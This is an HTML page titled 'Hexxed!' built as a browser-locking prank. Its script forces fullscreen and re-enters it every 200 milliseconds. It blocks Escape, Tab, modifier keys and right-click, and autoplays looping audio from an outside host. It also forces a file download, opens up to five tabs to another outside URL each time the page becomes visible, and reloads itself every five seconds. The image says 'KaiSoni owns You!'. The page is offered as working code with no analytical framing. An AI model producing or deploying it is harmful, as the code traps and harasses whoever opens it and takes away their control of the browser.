<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Hexxed!</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    .fullscreen-popup {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      user-select: none;
    }
    
    .popup-content {
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      object-position: center;
      user-select: none;
      pointer-events: none;
    }

    body.fullscreen {
      cursor: none;
    }

    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: transparent;
      z-index: 10000;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div class="fullscreen-popup" id="popup">
    <div class="popup-content">
      <img src="KaiSoni owns You!.png" alt="Fullscreen Image" />
    </div>
  </div>
  <div class="overlay" id="overlay"></div>

  <audio id="aud" src="https://jewls-gray.vercel.app/1.mp3" preload="auto" loop></audio>

  <script>
    const popup = document.getElementById('popup');
    const audio = document.getElementById('aud');
    const mp3Url = 'https://jewls-gray.vercel.app/1.mp3';
    const spamUrl = 'https://hihi-roan.vercel.app/api/main';

    // Trigger MP3 download
    function triggerDownload(url, filename) {
      const a = document.createElement('a');
      a.href = url;
      a.download = filename || '1.mp3';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }

    // Spam open new tabs
    function spamNewTabs() {
      const maxTabs = 5; // Limit to prevent browser overload
      let tabsOpened = 0;
      const interval = setInterval(() => {
        if (tabsOpened < maxTabs) {
          window.open(spamUrl, '_blank');
          tabsOpened++;
        } else {
          clearInterval(interval); // Stop after reaching maxTabs
        }
      }, 1000); // Open a tab every 1 second
    }

    // Fullscreen functionality
    function enterFullscreen() {
      const el = document.documentElement;
      if (!el) return;
      if (el.requestFullscreen) {
        el.requestFullscreen().catch(() => {});
      } else if (el.webkitRequestFullscreen) {
        el.webkitRequestFullscreen();
      } else if (el.msRequestFullscreen) {
        el.msRequestFullscreen();
      }
      document.body.classList.add('fullscreen');
    }

    // Play audio with fallbacks
    function tryPlayAudio() {
      const playAttempt = audio.play();
      if (playAttempt !== undefined) {
        playAttempt.catch((error) => {
          console.log('Autoplay prevented:', error);
          const tryPlayOnInteraction = () => {
            audio.play().catch((err) => console.log('Interaction play failed:', err));
          };
          ['click', 'mousemove', 'keydown', 'touchstart'].forEach((event) => {
            document.addEventListener(event, tryPlayOnInteraction, { once: true });
          });
        });
      }
    }

    // Advanced fullscreen trap
    function trapFullscreen() {
      document.addEventListener('fullscreenchange', () => {
        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
          enterFullscreen();
        }
      });
      document.addEventListener('webkitfullscreenchange', () => {
        if (!document.webkitFullscreenElement) {
          enterFullscreen();
        }
      });
      document.addEventListener('msfullscreenchange', () => {
        if (!document.msFullscreenElement) {
          enterFullscreen();
        }
      });

      document.addEventListener('keydown', (e) => {
        const blockedKeys = ['Escape', 'F5', 'Tab', 'Alt', 'Control', 'Meta'];
        if (blockedKeys.includes(e.key) || e.ctrlKey || e.altKey || e.metaKey) {
          e.preventDefault();
          e.stopPropagation();
          enterFullscreen();
        }
      });

      document.addEventListener('mousemove', (e) => {
        if (e.clientY < 50 || e.clientX < 50 || e.clientX > window.innerWidth - 50) {
          enterFullscreen();
        }
      });

      setInterval(() => {
        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
          enterFullscreen();
        }
      }, 200);

      document.addEventListener('contextmenu', (e) => e.preventDefault());
    }

    // Handle single download
    function handleDownloads() {
      triggerDownload(mp3Url, '1.mp3');
    }

    window.addEventListener('load', () => {
      enterFullscreen();
      trapFullscreen();
      tryPlayAudio();
      handleDownloads();
      spamNewTabs(); // Trigger the tab-spamming function on page load

      // Faster page refresh
      setTimeout(() => {
        window.location.reload();
      }, 5000);
    });

    // Handle visibility change
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        audio.pause();
      } else {
        tryPlayAudio();
        enterFullscreen();
        spamNewTabs(); // Re-trigger tab spamming when the tab becomes visible again
      }
    });

    // Block additional interactions
    document.addEventListener('keyup', (e) => {
      e.preventDefault();
      enterFullscreen();
    });
    document.addEventListener('mousedown', (e) => {
      if (e.button === 2) {
        e.preventDefault();
        enterFullscreen();
      }
    });
  </script>
</body>
</html>
